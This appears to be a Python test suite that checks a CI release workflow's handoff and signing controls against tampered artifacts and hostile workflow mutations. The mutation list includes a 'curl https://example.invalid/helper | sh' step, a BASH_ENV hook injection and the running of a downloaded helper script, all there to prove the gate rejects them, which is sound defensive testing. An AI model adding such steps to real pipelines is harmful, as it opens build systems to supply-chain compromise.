#!/usr/bin/env python3
"""Execute the workflow's actual inline handoff checks against adversarial artifacts."""
import copy
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest
import zipfile

import yaml

ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = yaml.safe_load((ROOT / '.github/workflows/official-build.yml').read_text())


def code(job, step):
    body = next(s['run'] for s in WORKFLOW['jobs'][job]['steps'] if s.get('name') == step)
    return body.split("python3 - <<'PY'\n", 1)[1].rsplit('\nPY', 1)[0]


class HandoffControls(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.source = self.root / 'source'
        self.final = self.root / 'final'
        self.scratch = self.root / 'scratch'
        for path in (self.source, self.final, self.scratch):
            path.mkdir()
        self.env = dict(os.environ, GITHUB_REPOSITORY='owner/repo', GITHUB_SHA='a'*40,
                        GITHUB_REF='refs/tags/v1.2.3', GITHUB_RUN_ID='42', GITHUB_RUN_ATTEMPT='2',
                        GITHUB_OUTPUT=str(self.scratch / 'output'), RUNNER_TEMP=str(self.scratch),
                        HANDOFF_ARTIFACT_ID='123', EXPECTED_ARTIFACT_DIGEST='b'*64,
                        RELEASE_CANDIDATE_VERSION='1.2.3')
        (self.source / 'packages').mkdir()
        (self.source / 'sbom').mkdir()
        with zipfile.ZipFile(self.source / 'packages/Widget.1.2.3.nupkg', 'w') as z:
            z.writestr('Widget.nuspec', '<package><metadata><id>Widget</id><version>1.2.3</version></metadata></package>')
            z.writestr('lib/net10.0/Widget.dll', b'original assembly')
        (self.source / 'sbom/bom.json').write_text('{"components": []}')
        self.execute('build-packages', 'Record the unsigned handoff', self.source)
        self.env['HANDOFF_MANIFEST_SHA256'] = (self.scratch / 'output').read_text().strip().split('=', 1)[1]
        shutil.copytree(self.source / 'official-handoff', self.final / 'official-handoff')

    def execute(self, job, step, root=None, succeeds=True):
        result = subprocess.run([sys.executable, '-c', code(job, step)], cwd=root or self.final,
                                env=self.env, capture_output=True, text=True, timeout=20)
        if succeeds:
            self.assertEqual(0, result.returncode, result.stdout + result.stderr)
        else:
            self.assertNotEqual(0, result.returncode, result.stdout + result.stderr)
        return result

    def verify(self, succeeds=True):
        return self.execute('packages', 'Verify unsigned handoff contents', succeeds=succeeds)

    def test_record_and_verify_complete_handoff(self):
        self.verify()
        self.assertTrue((self.final / 'packages/Widget.1.2.3.nupkg').is_file())
        self.execute('packages', 'Verify signing preserved package payloads')

    def test_changed_package_fails(self):
        (self.final / 'official-handoff/packages/Widget.1.2.3.nupkg').write_bytes(b'substituted')
        self.verify(False)

    def test_changed_sbom_fails(self):
        (self.final / 'official-handoff/sbom/bom.json').write_text('altered')
        self.verify(False)

    def test_extra_downloaded_script_fails(self):
        (self.final / 'official-handoff/packages/helper.py').write_text('raise SystemExit(0)')
        self.verify(False)

    def test_missing_file_fails(self):
        (self.final / 'official-handoff/sbom/bom.json').unlink()
        self.verify(False)

    def test_manifest_substitution_fails(self):
        (self.final / 'official-handoff/handoff.json').write_text('{}')
        self.verify(False)

    def test_invocation_binding_fails_for_every_context_field(self):
        for key in ('GITHUB_REPOSITORY', 'GITHUB_SHA', 'GITHUB_REF', 'GITHUB_RUN_ID', 'GITHUB_RUN_ATTEMPT'):
            with self.subTest(key=key):
                original = self.env[key]
                self.env[key] = 'wrong'
                self.verify(False)
                self.env[key] = original

    def test_requested_version_mismatch_fails(self):
        self.env['RELEASE_CANDIDATE_VERSION'] = '9.9.9'
        self.verify(False)

    def test_signature_only_change_preserves_payloads(self):
        self.verify()
        with zipfile.ZipFile(self.final / 'packages/Widget.1.2.3.nupkg', 'a') as z:
            z.writestr('.signature.p7s', b'synthetic signature, no validity claim')
        self.execute('packages', 'Verify signing preserved package payloads')

    def test_signing_payload_change_fails(self):
        self.verify()
        with zipfile.ZipFile(self.final / 'packages/Widget.1.2.3.nupkg', 'w') as z:
            z.writestr('Widget.nuspec', 'changed metadata')
        self.execute('packages', 'Verify signing preserved package payloads', succeeds=False)

    def test_signing_decision_enforces_credential_and_unsigned_policy(self):
        bash = str(Path(os.environ.get('ProgramFiles', 'C:/Program Files')) / 'Git/bin/bash.exe') if os.name == 'nt' else shutil.which('bash')
        self.assertTrue(bash and Path(bash).is_file(), 'Bash is required to execute the signing decision controls')
        script = next(s['run'] for s in WORKFLOW['jobs']['packages']['steps']
                      if s.get('name') == 'Decide whether this build must be signed')
        cases = [
            ('deliberately unsigned', '', '', '1.2.3', 'true', True, 'false'),
            ('required certificate absent', '', '', '1.2.3', 'false', False, 'false'),
            ('unsigned policy absent', '', '', '1.2.3', '', False, 'false'),
            ('nonrelease branch', '', '', '', 'false', True, 'false'),
            ('certificate only', 'synthetic-certificate', '', '1.2.3', 'true', False, 'false'),
            ('password only', '', 'synthetic-password', '1.2.3', 'true', False, 'false'),
            ('partial branch credentials', 'synthetic-certificate', '', '', 'true', False, 'false'),
            ('complete credentials', 'synthetic-certificate', 'synthetic-password', '1.2.3', 'false', True, 'true'),
        ]
        for name, cert, password, version, allow, succeeds, sign in cases:
            with self.subTest(case=name):
                output = self.scratch / 'signing-output'
                output.write_text('')
                env = dict(self.env, GITHUB_OUTPUT=output.as_posix(),
                           NUGET_SIGNING_CERT_BASE64=cert, NUGET_SIGNING_CERT_PASSWORD=password,
                           RELEASE_CANDIDATE_VERSION=version, ALLOW_UNSIGNED_RELEASE=allow)
                result = subprocess.run([bash, '--noprofile', '--norc', '-c', script],
                                        cwd=self.final, env=env, capture_output=True, text=True, timeout=20)
                self.assertEqual(succeeds, result.returncode == 0, result.stdout + result.stderr)
                self.assertEqual('sign=' + sign, output.read_text().splitlines()[-1])

    def test_artifact_metadata_binding(self):
        good = {'id': 123, 'name': 'official-build-handoff-42-2', 'expired': False,
                'workflow_run': {'id': 42, 'head_sha': 'a'*40}, 'digest': 'sha256:'+'b'*64}
        metadata = self.scratch / 'handoff-artifact.json'
        metadata.write_text(json.dumps(good))
        self.execute('packages', 'Verify the handoff artifact identity')
        for key, bad in [('id', 124), ('name', 'official-build-handoff-42-1'), ('expired', True),
                         ('workflow_run', {'id': 41, 'head_sha': 'a'*40}),
                         ('workflow_run', {'id': 42, 'head_sha': 'c'*40}), ('digest', 'sha256:'+'c'*64)]:
            with self.subTest(key=key, bad=bad):
                model = copy.deepcopy(good); model[key] = bad
                metadata.write_text(json.dumps(model))
                self.execute('packages', 'Verify the handoff artifact identity', succeeds=False)

    def test_environment_requires_review_and_ref_restrictions(self):
        good = {'can_admins_bypass': False, 'deployment_branch_policy': {'protected_branches': False, 'custom_branch_policies': True},
                'protection_rules': [{'type': 'required_reviewers', 'reviewers': [{'id': 1}], 'prevent_self_review': True}]}
        rules_path = self.scratch / 'signing-ref-policies.json'
        rules = [{'branch_policies': [{'type': 'branch', 'name': 'main'}, {'type': 'tag', 'name': 'v*'}]}]
        rules_path.write_text(json.dumps(rules))
        metadata = self.scratch / 'signing-environment.json'
        metadata.write_text(json.dumps(good))
        self.execute('packages', 'Verify signing environment protections')
        for key, bad in [('can_admins_bypass', True), ('can_admins_bypass', None),
                         ('deployment_branch_policy', None), ('protection_rules', [])]:
            with self.subTest(key=key):
                model = copy.deepcopy(good); model[key] = bad
                metadata.write_text(json.dumps(model))
                self.execute('packages', 'Verify signing environment protections', succeeds=False)
        metadata.write_text(json.dumps(good))
        for bad in ([{'type': 'branch', 'name': '*'}], [],
                    rules[0]['branch_policies'] + [{'type': 'branch', 'name': 'feature/*'}]):
            rules_path.write_text(json.dumps([{'branch_policies': bad}]))
            self.execute('packages', 'Verify signing environment protections', succeeds=False)

    def test_split_workflow_mutations_are_rejected(self):
        spec = importlib.util.spec_from_file_location('promotion', ROOT / 'eng/ci/promotion-contract-gate.py')
        gate = importlib.util.module_from_spec(spec); spec.loader.exec_module(gate)
        workflows, error = gate.load_workflows(str(ROOT / '.github/workflows'))
        self.assertIsNone(error)
        self.assertEqual([], gate.check(workflows))
        def final(w): return w['official-build.yml']['jobs']['packages']
        def source(w): return w['official-build.yml']['jobs']['build-packages']
        def step(w, name): return next(s for s in final(w)['steps'] if s.get('name') == name)
        mutations = {
            'source authority': lambda w: source(w)['permissions'].update({'id-token': 'write'}),
            'source secret': lambda w: source(w).update({'env': {'CERT': '${{ secrets.CERT }}'}}),
            'unchecked ref': lambda w: source(w).pop('if'),
            'bypass build': lambda w: final(w).update({'if': 'always()'}),
            'persistent runner': lambda w: final(w).update({'runs-on': 'self-hosted'}),
            'source checkout': lambda w: final(w)['steps'].append({'uses': 'actions/checkout@'+'a'*40}),
            'arbitrary shell': lambda w: final(w)['steps'].append({'run': 'curl https://example.invalid/helper | sh'}),
            'external action': lambda w: final(w)['steps'].append({'uses': 'vendor/action@'+'a'*40}),
            'expanded finalizer authority': lambda w: final(w)['permissions'].update({'contents': 'write'}),
            'inherited shell hook': lambda w: w['official-build.yml']['env'].update({'BASH_ENV': 'official-handoff/hook'}),
            'replaced verifier body': lambda w: step(w, 'Verify unsigned handoff contents').update({'run': 'echo verified'}),
            'downloaded helper': lambda w: final(w)['steps'].append({'run': 'python3 official-handoff/helper.py'}),
            'tool restore': lambda w: final(w)['steps'].append({'run': 'dotnet tool restore'}),
            'unprotected job': lambda w: final(w).pop('environment'),
            'job-wide credentials': lambda w: final(w)['env'].update({'CERT': '${{ secrets.CERT }}'}),
            'digest warning': lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'digest-mismatch': 'warn'}),
            'artifact name instead of ID': lambda w: step(w, 'Download the verified unsigned handoff')['with'].update({'name': 'other'}),
            'skip verification': lambda w: step(w, 'Verify unsigned handoff contents').update({'if': 'false'}),
            'softened verification': lambda w: step(w, 'Verify unsigned handoff contents').update({'continue-on-error': True}),
            'wrong output ID': lambda w: source(w)['outputs'].update({'handoff-id': '123'}),
            'sign after hashing': lambda w: final(w)['steps'].reverse(),
            'rival source artifact': lambda w: source(w)['steps'].append({'uses': 'actions/upload-artifact@'+'a'*40, 'with': {'name': 'other', 'path': 'packages/'}}),
        }
        for name, mutate in mutations.items():
            with self.subTest(name=name):
                model = copy.deepcopy(workflows); mutate(model)
                self.assertTrue(any(problem.assertion == 'A9' for problem in gate.check(model)))


if __name__ == '__main__':
    unittest.main(verbosity=2)
